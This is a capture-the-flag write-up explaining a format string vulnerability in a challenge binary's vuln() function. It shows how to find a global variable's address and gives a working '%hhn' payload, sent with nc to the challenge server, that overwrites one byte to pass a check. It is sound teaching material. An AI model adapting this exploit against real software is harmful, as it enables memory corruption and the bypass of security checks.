# Challenge `Write Specific Byte` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format String Vulnerability (Partial Arbitrary Write)
- Where: Where is the vulnerability present
  - In `vuln()` function at `printf(buffer);`. The buffer is fully controlled by user input via `read()` in `main()`.
- Impact: What results of exploiting this vulnerability
  - An attacker can overwrite individual bytes of memory. This allows bypassing security checks that depend on only part of a variable. In this case, the most significant byte of target is manipulated to pass a validation check.

## Steps to reproduce

1. Locate the target variable
```sh
nm 05_write_specific_byte | grep target
---------------
Output:
0804c044 B target
```
So we now know target is a global variable, located at address `0x0804c044`

2. Identify the most significant byte address
`target + 3 = 0x0804c047`

3. Craft the exploit payload. We need to write the value `0x02` to the MSB of target.

Python exploit:
```py
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25195
from pwn import *
import sys
sys.stdout.buffer.write(p32(0x0804c047) + b"%254x%7$hhn")
EOF
```

4. Result: MSB of target becomes `0x02` so the condition passes and the flag is printed successfully.